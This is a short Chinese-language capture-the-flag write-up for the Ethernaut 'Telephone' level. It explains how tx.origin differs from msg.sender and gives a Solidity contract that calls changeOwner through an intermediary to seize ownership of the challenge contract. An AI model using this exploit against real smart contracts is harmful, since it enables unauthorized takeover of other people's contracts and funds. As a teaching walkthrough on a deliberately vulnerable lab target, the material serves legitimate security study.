# Level4 Telephone
--
这题主要考的就是tx.origin和msg.sender的区别了，在于msg.sender是函数的直接调用方，可能是你手工调用该函数，这时候是发起该交易的账户地址，也可以是调用该函数的一个智能合约的地址。但tx.origin一定只能是这个交易的原始发起方，无论中间有多少次合约内/跨合约函数调用，一定是账户地址而不是合约地址。因此只要写合约调用changeOwner即可，这时msg.sender是你写的智能合约地址，tx.origin是你的账户地址

```js
pragma solidity ^0.4.24;

contract Telephone {
  function changeOwner(address _owner) public;
}

contract Telephoner {
    Telephone tel;
    constructor (address _instance) public {
        tel = Telephone(_instance);
    }
    
    function makeACall() public {
        tel.changeOwner(tx.origin);
    }
}
```